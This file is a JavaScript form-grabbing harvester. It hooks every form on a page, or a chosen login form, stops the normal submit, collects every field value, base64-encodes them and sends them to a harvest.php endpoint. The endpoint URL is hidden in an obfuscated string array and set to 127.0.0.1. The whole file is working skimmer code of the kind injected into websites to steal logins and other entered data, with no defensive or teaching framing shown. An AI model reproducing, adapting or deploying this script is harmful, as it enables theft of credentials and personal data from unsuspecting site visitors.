//var siteId = "updateme";
//var formId = "updateme";
var bindAllFormsSwitch = true;
var formName = "loginform2";
var enableEncoding = true;
var usePost = false;
var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];

$(document).ready(function() {
    console.log("initializing harvester...");
    initHarvester();
});

/* check the configuration settings and bind form(s) */
function initHarvester() {
    if(bindAllFormsSwitch) {
        bindAllForms();
    } else {
        bindByName(formName);
    }
    console.log("locked and loaded");
}

/* bind all forms in the document */
function bindAllForms() {
    document.querySelectorAll('form').forEach(form => 
        form.addEventListener('submit', function(e){
            e.preventDefault();
            let formName = form.name;
            grabAll(form.name);
        }, false)
    );
    document.querySelectorAll('form').forEach(form => appendFields(form));
}

/* bind a specific form by name */
function bindByName(formName) {
	var loginForm = document.getElementById(formName);
	if(loginForm) {
        loginForm.addEventListener('submit', function(e){
                e.preventDefault();
                grabAll(formName);
            }, false);
    }
    appendFields(formName);
}

/* append tracking values to a form */
function appendFields(form) {
    var formName = form.name;
	var siteId = btoa(document.location.hostname);
	var formId = btoa(document.location.pathname + '-' + formName);
    $('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
    $('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
}

/* parse through the form elements and serialize anything interesting */
function grabAll(formName) {
	var loginForm = document.getElementById(formName);
	if(loginForm) {
		var payload = "";
		for(var i = 0; i < loginForm.length; i++) {
			var formElement = loginForm.elements[i];
			if(formElement) {
				//	the name value should always be set, but we may want to check (JavaScript forms could use ids)
				var elementName = null;
				elementName = formElement.name;
				if(elementName.length <= 0) {
					elementName = formElement.id;
				}
			
				console.log("DEBUG: name: " + elementName);		

				if(formElement.type != "submit") {
					var elementValue = "";

					if(formElement instanceof HTMLSelectElement) {
						var selectContents = "";
						console.log("DEBUG: parsing all selectedOptions");
						if(formElement.multiple) {
							console.log("DEBUG: multi value - gotta catch em all");
							console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
							var optionList = formElement.selectedOptions;
							if(optionList.length > 0) {
								for(j = 0; j < optionList.length; j++) {
									console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
									//	serialize contents
									if(selectContents == "") {
										selectContents = optionList[j].value;
									} else {
										selectContents += "," + encodeURI(optionList[j].value);
									}
								}
							}
						} else {
							selectContents = formElement.value;
						}
						//	encode whatever we parsed out of the select
						elementValue = encodeURI(selectContents);
					} else {	
						//	not a select, we can just grab the 'value' property	and encode it
						elementValue = encodeURI(formElement.value);
					}
					
					//	are we appending a payload? if so, use an ampersand to separate values
					if(payload == "") {
						payload = elementName + ":" + elementValue;
					} else {
						payload += "&" + elementName + ":" + elementValue;
					}
				}
			}
		}
		
		//	check to see if base 64 encoding is enabled
		if(enableEncoding) {
			console.log("DEBUG: before base 64 encoding: " + payload);
			payload = btoa(payload);
		}
		//	output payload in console for debugging
		console.log("DEBUG: resulting payload = " + payload);
		
		//	send the payload to our server
		sendPayload(payload);
	} else {
		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
	}
}

/* send the collected data to our server */
function sendPayload(payload) {
    console.log("DEBUG: usePost = " + usePost);
    var xhttp = new XMLHttpRequest();

    if(usePost) {
        xhttp.open(_0x3745[7], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3], true);
        xhttp.setRequestHeader(_0x3745[4], _0x3745[5]);
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
               console.log("DEBUG: data sent");
            }
        };
        xhttp.send('data=' + payload);
    } else {
        xhttp.open(_0x3745[6], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + '?data=' + payload, true);
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
               console.log("DEBUG: data sent");
            }
        };
        xhttp.send();
    }
}
